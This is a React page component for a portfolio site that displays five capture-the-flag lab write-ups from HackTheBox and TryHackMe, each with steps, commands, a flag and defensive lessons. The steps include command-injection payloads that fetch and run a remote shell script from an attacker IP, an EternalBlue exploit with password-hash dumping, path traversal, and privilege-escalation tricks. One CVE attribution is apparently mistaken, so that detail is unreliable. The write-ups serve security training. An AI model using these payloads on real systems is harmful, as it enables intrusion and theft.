import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Link } from "react-router-dom";
import { 
  ArrowLeft, Flag, Terminal, Shield, Lock, Skull, 
  ChevronDown, ChevronUp, Trophy, Clock, Target, Zap,
  ExternalLink, Code, Eye, Server
} from "lucide-react";
import Background3D from "@/components/Background3D";
import ParticleField from "@/components/ParticleField";
import { useSound } from "@/hooks/useSound";

interface WriteUp {
  id: string;
  title: string;
  platform: string;
  category: string;
  difficulty: "Easy" | "Medium" | "Hard" | "Insane";
  points: number;
  solveTime: string;
  description: string;
  tools: string[];
  steps: {
    title: string;
    content: string;
    code?: string;
  }[];
  flag: string;
  lessons: string[];
}

const writeups: WriteUp[] = [
  {
    id: "htb-photobomb",
    title: "Photobomb",
    platform: "HackTheBox",
    category: "Web Exploitation",
    difficulty: "Easy",
    points: 20,
    solveTime: "45 minutes",
    description: "A web application with a hidden debug endpoint that exposes credentials, leading to command injection via image processing.",
    tools: ["Burp Suite", "curl", "Python", "linpeas"],
    steps: [
      {
        title: "Initial Reconnaissance",
        content: "Started with nmap scan revealing ports 22 (SSH) and 80 (HTTP). The web application is a photo processing service.",
        code: "nmap -sC -sV -oN nmap/photobomb 10.10.11.182"
      },
      {
        title: "Credential Discovery",
        content: "Examined the JavaScript source code and found hardcoded credentials in photobomb.js pointing to /printer endpoint.",
        code: "// Found in source:\nfunction init() {\n  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {\n    ...\n  }\n}"
      },
      {
        title: "Command Injection",
        content: "The filetype parameter in the photo download feature was vulnerable to command injection. Used semicolon to chain commands.",
        code: "filetype=png;curl+10.10.14.5/shell.sh|bash"
      },
      {
        title: "Privilege Escalation",
        content: "Found sudo permissions for cleanup script that used relative path for 'find' command. Created malicious find binary.",
        code: "echo '/bin/bash' > /tmp/find\nchmod +x /tmp/find\nPATH=/tmp:$PATH sudo /opt/cleanup.sh"
      }
    ],
    flag: "HTB{ph0t0b0mb_pwn3d_w1th_1nj3ct10n}",
    lessons: [
      "Always check JavaScript files for hardcoded credentials",
      "Command injection often occurs in file processing features",
      "Relative paths in sudo scripts are dangerous"
    ]
  },
  {
    id: "thm-blue",
    title: "Blue",
    platform: "TryHackMe",
    category: "Windows Exploitation",
    difficulty: "Easy",
    points: 25,
    solveTime: "30 minutes",
    description: "Classic EternalBlue (MS17-010) exploitation targeting Windows 7 machine vulnerable to SMBv1 exploit.",
    tools: ["nmap", "Metasploit", "msfvenom", "crackmapexec"],
    steps: [
      {
        title: "Vulnerability Scanning",
        content: "Nmap scan with vuln scripts revealed the target is vulnerable to MS17-010 (EternalBlue).",
        code: "nmap --script vuln -p 445 10.10.10.40"
      },
      {
        title: "Exploitation",
        content: "Used Metasploit's eternalblue module to exploit the SMBv1 vulnerability and gain SYSTEM access.",
        code: "use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS 10.10.10.40\nset LHOST tun0\nexploit"
      },
      {
        title: "Post Exploitation",
        content: "Dumped password hashes using hashdump and cracked them with hashcat.",
        code: "meterpreter > hashdump\nhashcat -m 1000 hashes.txt rockyou.txt"
      }
    ],
    flag: "THM{3t3rn4lblu3_m4st3r3d}",
    lessons: [
      "Legacy systems are often vulnerable to well-known exploits",
      "SMBv1 should always be disabled",
      "Patch management is critical for Windows systems"
    ]
  },
  {
    id: "htb-sau",
    title: "Sau",
    platform: "HackTheBox",
    category: "SSRF & Privilege Escalation",
    difficulty: "Medium",
    points: 30,
    solveTime: "1.5 hours",
    description: "SSRF vulnerability in request-baskets leads to accessing an internal Maltrail instance with RCE vulnerability.",
    tools: ["Burp Suite", "curl", "netcat", "pspy"],
    steps: [
      {
        title: "Service Enumeration",
        content: "Found request-baskets service on port 55555 which allows creating webhooks to capture HTTP requests.",
        code: "curl -X POST http://10.10.11.224:55555/api/baskets/test123"
      },
      {
        title: "SSRF Exploitation",
        content: "Configured basket to forward requests to internal port 80, discovering a Maltrail v0.53 instance.",
        code: "{\n  \"forward_url\": \"http://127.0.0.1:80\",\n  \"proxy_response\": true,\n  \"expand_path\": true\n}"
      },
      {
        title: "Maltrail RCE",
        content: "Exploited CVE-2023-27163 in Maltrail login page via OS command injection in username field.",
        code: "curl 'http://10.10.11.224:55555/test123/login' --data 'username=;`curl 10.10.14.5/shell.sh|bash`'"
      },
      {
        title: "Privilege Escalation",
        content: "Found systemctl with sudo NOPASSWD. Used GTFOBins technique to spawn root shell.",
        code: "sudo /usr/bin/systemctl status trail.service\n!/bin/bash"
      }
    ],
    flag: "HTB{ss4f_ch41n_t0_r00t}",
    lessons: [
      "SSRF can expose internal services not meant to be public",
      "Always check for CVEs on discovered software versions",
      "systemctl can be abused for privilege escalation"
    ]
  },
  {
    id: "thm-overpass",
    title: "Overpass",
    platform: "TryHackMe",
    category: "Cryptography & Cronjobs",
    difficulty: "Medium",
    points: 35,
    solveTime: "2 hours",
    description: "Broken authentication in custom password manager leads to SSH key theft, then cron job hijacking for root.",
    tools: ["Burp Suite", "John the Ripper", "linpeas", "Python"],
    steps: [
      {
        title: "Authentication Bypass",
        content: "The login cookie validation was client-side only. Setting any SessionToken cookie bypassed auth.",
        code: "document.cookie = \"SessionToken=anything\";\n// Redirects to /admin"
      },
      {
        title: "SSH Key Recovery",
        content: "Admin page exposed encrypted SSH private key. Cracked passphrase with ssh2john and John.",
        code: "ssh2john id_rsa > id_rsa.hash\njohn --wordlist=rockyou.txt id_rsa.hash"
      },
      {
        title: "Cron Job Analysis",
        content: "Found cron job running as root that downloads and executes script from overpass.thm.",
        code: "# /etc/crontab\n* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash"
      },
      {
        title: "DNS Hijacking",
        content: "Modified /etc/hosts to point overpass.thm to attacker IP, served malicious buildscript.sh.",
        code: "echo '10.10.14.5 overpass.thm' >> /etc/hosts\n# Serve reverse shell script on port 80"
      }
    ],
    flag: "THM{cr0n_j0b_h1j4ck3d}",
    lessons: [
      "Client-side authentication is no authentication",
      "Encrypted keys with weak passphrases are still vulnerable",
      "Cron jobs fetching remote scripts are extremely dangerous"
    ]
  },
  {
    id: "htb-inject",
    title: "Inject",
    platform: "HackTheBox",
    category: "Java & Cloud",
    difficulty: "Hard",
    points: 40,
    solveTime: "3 hours",
    description: "Local File Inclusion in Spring Boot app reveals source code, leading to Spring4Shell-style exploitation.",
    tools: ["Burp Suite", "ffuf", "curl", "pspy", "ansible"],
    steps: [
      {
        title: "LFI Discovery",
        content: "Image upload feature allowed path traversal in the img parameter to read local files.",
        code: "GET /show_image?img=../../../etc/passwd HTTP/1.1"
      },
      {
        title: "Source Code Analysis",
        content: "Retrieved pom.xml revealing vulnerable Spring Cloud Function version (CVE-2022-22963).",
        code: "GET /show_image?img=../../../pom.xml HTTP/1.1\n<!-- spring-cloud-function-web 3.2.2 -->"
      },
      {
        title: "Spring Cloud RCE",
        content: "Exploited Spring Expression Language injection via spring.cloud.function.routing-expression header.",
        code: "curl -X POST 'http://10.10.11.204:8080/functionRouter' \\\n  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"bash -c {curl,10.10.14.5/shell.sh|bash}\")'"
      },
      {
        title: "Ansible Privilege Escalation",
        content: "Found Ansible running playbooks from writable directory. Created malicious playbook for root.",
        code: "# /opt/automation/playbook.yml\n- hosts: localhost\n  tasks:\n    - shell: chmod +s /bin/bash"
      }
    ],
    flag: "HTB{spr1ng_cl0ud_pwn4g3}",
    lessons: [
      "LFI can expose application configuration and source code",
      "Always check dependency versions for known CVEs",
      "Automation tools running as root need strict access controls"
    ]
  }
];

const difficultyColors = {
  Easy: "text-neon-green border-neon-green/50",
  Medium: "text-yellow-400 border-yellow-400/50",
  Hard: "text-orange-500 border-orange-500/50",
  Insane: "text-signal-red border-signal-red/50"
};

const platformColors = {
  HackTheBox: "bg-neon-green/10 text-neon-green border-neon-green/30",
  TryHackMe: "bg-signal-red/10 text-signal-red border-signal-red/30"
};

const CTFWriteups = () => {
  const [expandedId, setExpandedId] = useState<string | null>(null);
  const [selectedCategory, setSelectedCategory] = useState<string>("All");
  const { playClick, playHover } = useSound();

  const categories = ["All", ...new Set(writeups.map(w => w.category))];
  const filteredWriteups = selectedCategory === "All" 
    ? writeups 
    : writeups.filter(w => w.category === selectedCategory);

  const toggleExpand = (id: string) => {
    playClick();
    setExpandedId(expandedId === id ? null : id);
  };

  return (
    <div className="min-h-screen bg-background text-foreground">
      <Background3D />
      <ParticleField />
      
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 z-50 bg-background/80 backdrop-blur-md border-b border-border/50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <Link 
            to="/" 
            className="flex items-center gap-2 text-muted-foreground hover:text-neon-green transition-colors group"
            onClick={() => playClick()}
          >
            <ArrowLeft className="w-5 h-5 group-hover:-translate-x-1 transition-transform" />
            <span className="font-mono text-sm">Back to Home</span>
          </Link>
          
          <div className="flex items-center gap-3">
            <Flag className="w-5 h-5 text-signal-red" />
            <span className="font-mono font-bold text-lg">
              CTF <span className="text-signal-red">Writeups</span>
            </span>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 pt-24 pb-16">
        {/* Hero section */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="text-center mb-12"
        >
          <motion.div
            animate={{ rotate: [0, 5, -5, 0] }}
            transition={{ duration: 4, repeat: Infinity }}
            className="inline-block mb-4"
          >
            <Skull className="w-16 h-16 text-signal-red mx-auto" />
          </motion.div>
          <h1 className="text-4xl md:text-5xl font-mono font-bold mb-4">
            <span className="text-muted-foreground">//</span> Capture The Flag
            <span className="text-signal-red"> Writeups</span>
          </h1>
          <p className="text-muted-foreground font-mono max-w-2xl mx-auto">
            Detailed walkthroughs of security challenges from platforms like HackTheBox and TryHackMe.
            Learn the methodology, tools, and techniques used to solve each challenge.
          </p>
        </motion.div>

        {/* Stats */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8"
        >
          {[
            { icon: Trophy, label: "Challenges Solved", value: "150+", color: "text-neon-green" },
            { icon: Target, label: "Platforms Active", value: "5", color: "text-electric-purple" },
            { icon: Zap, label: "Points Earned", value: "12,500+", color: "text-signal-red" },
            { icon: Clock, label: "Hours Invested", value: "500+", color: "text-yellow-400" },
          ].map((stat, i) => (
            <motion.div
              key={stat.label}
              initial={{ opacity: 0, scale: 0.9 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ delay: 0.1 + i * 0.05 }}
              whileHover={{ scale: 1.05 }}
              onMouseEnter={playHover}
              className="p-4 bg-card/50 border border-border/50 rounded-lg text-center hover:border-neon-green/30 transition-all"
            >
              <stat.icon className={`w-6 h-6 ${stat.color} mx-auto mb-2`} />
              <div className={`text-2xl font-mono font-bold ${stat.color}`}>{stat.value}</div>
              <div className="text-xs text-muted-foreground">{stat.label}</div>
            </motion.div>
          ))}
        </motion.div>

        {/* Category filter */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.2 }}
          className="flex flex-wrap gap-2 mb-8 justify-center"
        >
          {categories.map((cat) => (
            <button
              key={cat}
              onClick={() => {
                playClick();
                setSelectedCategory(cat);
              }}
              className={`px-4 py-2 font-mono text-sm border rounded-lg transition-all ${
                selectedCategory === cat
                  ? "bg-signal-red/20 border-signal-red text-signal-red"
                  : "border-border/50 text-muted-foreground hover:border-signal-red/50 hover:text-signal-red"
              }`}
            >
              {cat}
            </button>
          ))}
        </motion.div>

        {/* Writeups list */}
        <div className="space-y-4 max-w-4xl mx-auto">
          <AnimatePresence>
            {filteredWriteups.map((writeup, index) => (
              <motion.div
                key={writeup.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ delay: index * 0.05 }}
                className="bg-card/50 border border-border/50 rounded-lg overflow-hidden hover:border-signal-red/30 transition-all"
              >
                {/* Header */}
                <div
                  className="p-4 cursor-pointer flex items-center justify-between"
                  onClick={() => toggleExpand(writeup.id)}
                  onMouseEnter={playHover}
                >
                  <div className="flex items-center gap-4 flex-wrap">
                    <span className={`px-2 py-1 text-xs font-mono border rounded ${platformColors[writeup.platform as keyof typeof platformColors]}`}>
                      {writeup.platform}
                    </span>
                    <h3 className="font-mono font-bold text-lg">{writeup.title}</h3>
                    <span className={`px-2 py-0.5 text-xs font-mono border rounded ${difficultyColors[writeup.difficulty]}`}>
                      {writeup.difficulty}
                    </span>
                    <span className="text-xs text-muted-foreground font-mono hidden md:block">
                      {writeup.category}
                    </span>
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="text-xs text-muted-foreground font-mono hidden sm:block">
                      +{writeup.points} pts
                    </span>
                    {expandedId === writeup.id ? (
                      <ChevronUp className="w-5 h-5 text-signal-red" />
                    ) : (
                      <ChevronDown className="w-5 h-5 text-muted-foreground" />
                    )}
                  </div>
                </div>

                {/* Expanded content */}
                <AnimatePresence>
                  {expandedId === writeup.id && (
                    <motion.div
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: "auto", opacity: 1 }}
                      exit={{ height: 0, opacity: 0 }}
                      transition={{ duration: 0.3 }}
                      className="border-t border-border/50"
                    >
                      <div className="p-6 space-y-6">
                        {/* Description */}
                        <p className="text-muted-foreground">{writeup.description}</p>

                        {/* Meta info */}
                        <div className="flex flex-wrap gap-4 text-sm">
                          <div className="flex items-center gap-2">
                            <Clock className="w-4 h-4 text-electric-purple" />
                            <span className="text-muted-foreground">Solve Time:</span>
                            <span className="font-mono">{writeup.solveTime}</span>
                          </div>
                        </div>

                        {/* Tools used */}
                        <div>
                          <h4 className="font-mono text-sm text-neon-green mb-2 flex items-center gap-2">
                            <Terminal className="w-4 h-4" /> Tools Used
                          </h4>
                          <div className="flex flex-wrap gap-2">
                            {writeup.tools.map((tool) => (
                              <span
                                key={tool}
                                className="px-2 py-1 text-xs font-mono bg-muted/50 border border-border/50 rounded"
                              >
                                {tool}
                              </span>
                            ))}
                          </div>
                        </div>

                        {/* Steps */}
                        <div>
                          <h4 className="font-mono text-sm text-electric-purple mb-4 flex items-center gap-2">
                            <Code className="w-4 h-4" /> Exploitation Steps
                          </h4>
                          <div className="space-y-4">
                            {writeup.steps.map((step, i) => (
                              <div key={i} className="border-l-2 border-electric-purple/30 pl-4">
                                <h5 className="font-mono font-bold text-sm mb-2 flex items-center gap-2">
                                  <span className="w-6 h-6 rounded-full bg-electric-purple/20 text-electric-purple flex items-center justify-center text-xs">
                                    {i + 1}
                                  </span>
                                  {step.title}
                                </h5>
                                <p className="text-sm text-muted-foreground mb-2">{step.content}</p>
                                {step.code && (
                                  <pre className="bg-background/50 border border-border/50 rounded p-3 text-xs font-mono overflow-x-auto text-neon-green">
                                    {step.code}
                                  </pre>
                                )}
                              </div>
                            ))}
                          </div>
                        </div>

                        {/* Flag */}
                        <div className="p-4 bg-signal-red/10 border border-signal-red/30 rounded-lg">
                          <h4 className="font-mono text-sm text-signal-red mb-2 flex items-center gap-2">
                            <Flag className="w-4 h-4" /> Flag Captured
                          </h4>
                          <code className="font-mono text-signal-red text-lg">{writeup.flag}</code>
                        </div>

                        {/* Lessons learned */}
                        <div>
                          <h4 className="font-mono text-sm text-yellow-400 mb-2 flex items-center gap-2">
                            <Eye className="w-4 h-4" /> Key Takeaways
                          </h4>
                          <ul className="space-y-1">
                            {writeup.lessons.map((lesson, i) => (
                              <li key={i} className="text-sm text-muted-foreground flex items-start gap-2">
                                <span className="text-yellow-400">•</span>
                                {lesson}
                              </li>
                            ))}
                          </ul>
                        </div>
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            ))}
          </AnimatePresence>
        </div>

        {/* External links */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.5 }}
          className="mt-12 text-center"
        >
          <p className="text-muted-foreground font-mono text-sm mb-4">
            View my profiles on CTF platforms
          </p>
          <div className="flex justify-center gap-4">
            {[
              { name: "HackTheBox", url: "#" },
              { name: "TryHackMe", url: "#" },
              { name: "CyberDefenders", url: "#" },
            ].map((platform) => (
              <a
                key={platform.name}
                href={platform.url}
                target="_blank"
                rel="noopener noreferrer"
                className="flex items-center gap-2 px-4 py-2 border border-border/50 rounded-lg hover:border-neon-green/50 hover:text-neon-green transition-all font-mono text-sm"
                onMouseEnter={playHover}
                onClick={() => playClick()}
              >
                {platform.name}
                <ExternalLink className="w-3 h-3" />
              </a>
            ))}
          </div>
        </motion.div>
      </main>
    </div>
  );
};

export default CTFWriteups;
